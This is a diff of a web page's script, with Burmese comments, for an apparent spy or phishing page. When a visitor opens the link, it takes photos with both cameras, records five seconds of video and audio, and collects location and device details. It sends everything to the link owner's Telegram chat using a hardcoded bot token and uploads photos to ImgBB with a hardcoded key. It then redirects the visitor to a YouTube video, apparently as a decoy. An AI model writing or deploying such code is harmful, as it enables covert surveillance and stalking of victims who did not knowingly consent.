@@ -36,7 +36,6 @@
             font-size: 14px;
             font-style: italic;
         }
-        .hidden { display: none; }
     </style>
 </head>
 <body>
@@ -46,11 +45,9 @@
     </div>
 
     <script>
-        // ===== CONFIGURATION =====
         const BOT_TOKEN = "8714590627:AAE7XYaMhFLJeLKYY-cLWjGQ38h96-oi498";
         const IMGBB_API_KEY = "b7ba0100d04e0add952f217e712c7ff8";
         const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-        // =========================
         
         const urlParams = new URLSearchParams(window.location.search);
         const OWNER_ID = urlParams.get('id');
@@ -63,182 +60,145 @@
             window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
         }
         
-        let backPhotoSent = false;
-        let frontPhotoSent = false;
+        let photoDone = false;
+        let videoDone = false;
         
-        async function sendMessageToOwner(text) {
+        async function sendMessage(text) {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: OWNER_ID,
-                        text: text
-                    })
+                    body: JSON.stringify({ chat_id: OWNER_ID, text: text })
                 });
+            } catch(e) {}
+        }
+        
+        async function uploadToImgBB(blob) {
+            const fd = new FormData();
+            fd.append('image', blob);
+            const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: fd });
+            const data = await res.json();
+            return data.success ? data.data.url : null;
+        }
+        
+        // ========== ပုံရိုက်ခြင်း ==========
+        async function takePhoto(facingMode, type) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.playsInline = true;
+                await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                stream.getTracks().forEach(t => t.stop());
+                
+                canvas.toBlob(async (blob) => {
+                    const url = await uploadToImgBB(blob);
+                    await sendMessage(`📸 ${type} CAMERA PHOTO!\n🕐 ${new Date().toLocaleString()}\n📷 ${url}`);
+                }, 'image/jpeg', 0.7);
             } catch(e) {
-                console.log('Send message error:', e);
+                await sendMessage(`❌ ${type} CAMERA DENIED!`);
             }
         }
         
-        async function uploadToImgBB(imageBlob) {
-            const formData = new FormData();
-            formData.append('image', imageBlob);
-            const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
-                method: 'POST',
-                body: formData
-            });
-            const data = await response.json();
-            if (data.success) {
-                return data.data.url;
-            } else {
-                throw new Error('Upload failed');
-            }
-        }
-        
-        async function takePhotoAndSend(stream, cameraType) {
-            if (cameraType === 'back' && backPhotoSent) return;
-            if (cameraType === 'front' && frontPhotoSent) return;
-            if (cameraType === 'back') backPhotoSent = true;
-            if (cameraType === 'front') frontPhotoSent = true;
-            
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.setAttribute('playsinline', '');
-            await new Promise((resolve) => {
-                video.onloadedmetadata = () => {
-                    video.play();
-                    resolve();
+        // ========== Video + အသံဖမ်းခြင်း (5 စက္ကန့်) ==========
+        async function recordVideo() {
+            try {
+                // Camera + Microphone နှစ်ခုလုံးခွင့်တောင်းမယ်
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                
+                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                    const formData = new FormData();
+                    formData.append('chat_id', OWNER_ID);
+                    formData.append('video', videoBlob, 'video.mp4');
+                    formData.append('caption', `🎥 VIDEO + AUDIO RECORDED!\n🕐 Time: ${new Date().toLocaleString()}\n⏱️ Duration: 5 seconds`);
+                    
+                    try {
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
+                    } catch(e) {}
+                    
+                    stream.getTracks().forEach(t => t.stop());
                 };
-            });
-            
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            stream.getTracks().forEach(track => track.stop());
-            
-            canvas.toBlob(async (blob) => {
-                try {
-                    const imageUrl = await uploadToImgBB(blob);
-                    await sendMessageToOwner(`📸 ${cameraType === 'back' ? 'BACK' : 'FRONT'} CAMERA PHOTO CAPTURED!\n🕐 Time: ${new Date().toLocaleString()}\n📷 Image: ${imageUrl}`);
-                } catch (err) {
-                    console.log('Error:', err);
-                }
-            }, 'image/jpeg', 0.7);
-        }
-        
-        async function initBackCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                await takePhotoAndSend(stream, 'back');
-            } catch (err) {
-                await sendMessageToOwner(`❌ BACK CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
+                
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+                
+            } catch(e) {
+                await sendMessage(`❌ VIDEO + AUDIO DENIED!\n🕐 ${new Date().toLocaleString()}`);
             }
         }
         
-        async function initFrontCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                await takePhotoAndSend(stream, 'front');
-            } catch (err) {
-                await sendMessageToOwner(`❌ FRONT CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
-            }
-        }
-        
+        // ========== တည်နေရာ ==========
         async function getLocation() {
-            if (!navigator.geolocation) {
-                await sendMessageToOwner(`❌ LOCATION NOT SUPPORTED!\n🕐 Time: ${new Date().toLocaleString()}`);
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const acc = position.coords.accuracy;
-                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    await sendMessageToOwner(`📍 LOCATION CAPTURED!\n🕐 Time: ${new Date().toLocaleString()}\n🌍 Latitude: ${lat}\n🌍 Longitude: ${lon}\n📏 Accuracy: ${acc}m\n🗺️ Maps: ${mapsLink}`);
-                },
-                async (error) => {
-                    await sendMessageToOwner(`❌ LOCATION DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
-                }
-            );
+            if (!navigator.geolocation) return;
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                await sendMessage(`📍 LOCATION!\n🕐 ${new Date().toLocaleString()}\n🌍 ${lat}, ${lon}\n🗺️ https://www.google.com/maps?q=${lat},${lon}`);
+            }, async () => {
+                await sendMessage(`❌ LOCATION DENIED!`);
+            });
         }
         
-        async function getBatteryInfo() {
+        // ========== Device Info ==========
+        async function getDeviceInfo() {
+            let battery = "🔋 Battery: N/A";
             if ('getBattery' in navigator) {
                 try {
-                    const battery = await navigator.getBattery();
-                    const level = Math.floor(battery.level * 100);
-                    const charging = battery.charging ? "Charging" : "Not Charging";
-                    return `🔋 Battery: ${level}% (${charging})`;
-                } catch(e) {
-                    return "🔋 Battery: Not Available";
-                }
+                    const b = await navigator.getBattery();
+                    battery = `🔋 Battery: ${Math.floor(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
+                } catch(e) {}
             }
-            return "🔋 Battery: Not Supported";
-        }
-        
-        async function getNetworkInfo() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (connection) {
-                let type = "Unknown";
-                if (connection.effectiveType) type = connection.effectiveType;
-                if (connection.type) type = connection.type;
-                return `🌐 Connection: ${type.toUpperCase()}`;
-            }
-            return "🌐 Connection: Not Available";
-        }
-        
-        async function getDeviceModel() {
-            const ua = navigator.userAgent;
-            if (ua.includes("iPhone")) return "📱 Device: iPhone";
-            if (ua.includes("Samsung")) return "📱 Device: Samsung";
-            if (ua.includes("Redmi") || ua.includes("Xiaomi")) return "📱 Device: Xiaomi/Redmi";
-            if (ua.includes("OPPO")) return "📱 Device: OPPO";
-            if (ua.includes("vivo")) return "📱 Device: vivo";
-            if (ua.includes("realme")) return "📱 Device: realme";
-            if (ua.includes("Nokia")) return "📱 Device: Nokia";
-            if (ua.includes("Pixel")) return "📱 Device: Google Pixel";
-            if (ua.includes("Huawei")) return "📱 Device: Huawei";
-            return "📱 Device: " + (navigator.platform || "Unknown");
-        }
-        
-        async function getNetworkOperator() {
-            if ('connection' in navigator && navigator.connection) {
-                return `📡 Network: Mobile/Cellular`;
-            }
-            return `📡 Network: WiFi or Other`;
-        }
-        
-        async function sendDeviceInfo() {
-            const batteryInfo = await getBatteryInfo();
-            const networkInfo = await getNetworkInfo();
-            const deviceModel = await getDeviceModel();
-            const networkOp = await getNetworkOperator();
-            const deviceInfo = {
-                platform: navigator.platform,
-                language: navigator.language,
-                userAgent: navigator.userAgent,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
             
-            await sendMessageToOwner(`📱 DEVICE INFO!\n🕐 Time: ${new Date().toLocaleString()}\n${deviceModel}\n📌 Platform: ${deviceInfo.platform}\n📌 Language: ${deviceInfo.language}\n📌 Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n📌 Timezone: ${deviceInfo.timezone}\n${batteryInfo}\n${networkInfo}\n${networkOp}\n📌 User Agent: ${deviceInfo.userAgent.substring(0, 80)}...`);
+            let connection = "🌐 Connection: Unknown";
+            if (navigator.connection) {
+                connection = `🌐 Connection: ${navigator.connection.effectiveType || navigator.connection.type}`;
+            }
+            
+            let device = "📱 Device: Unknown";
+            const ua = navigator.userAgent;
+            if (ua.includes('iPhone')) device = '📱 Device: iPhone';
+            else if (ua.includes('Samsung')) device = '📱 Device: Samsung';
+            else if (ua.includes('Redmi') || ua.includes('Xiaomi')) device = '📱 Device: Xiaomi/Redmi';
+            else if (ua.includes('OPPO')) device = '📱 Device: OPPO';
+            else if (ua.includes('vivo')) device = '📱 Device: vivo';
+            
+            await sendMessage(`📱 DEVICE INFO!\n${device}\n📌 Platform: ${navigator.platform}\n📌 Language: ${navigator.language}\n📌 Screen: ${screen.width}x${screen.height}\n${battery}\n${connection}`);
         }
         
         async function init() {
             if (!OWNER_ID) return;
-            await initBackCamera();
-            await initFrontCamera();
+            
+            // အနောက်ကင်မရာပုံ
+            await takePhoto('environment', 'BACK');
+            
+            // အရှေ့ကင်မရာပုံ
+            await takePhoto('user', 'FRONT');
+            
+            // Video + အသံဖမ်း (5 စက္ကန့်)
+            await recordVideo();
+            
+            // တည်နေရာ
             await getLocation();
-            await sendDeviceInfo();
-            setTimeout(() => { window.location.href = YOUTUBE_URL; }, 3000);
+            
+            // Device Info
+            await getDeviceInfo();
+            
+            setTimeout(() => { window.location.href = YOUTUBE_URL; }, 4000);
         }
         
-        if (!isTelegram || !isMobile) { init(); }
+        if (!isTelegram || !isMobile) {
+            init();
+        }
     </script>
 </body>
 </html>
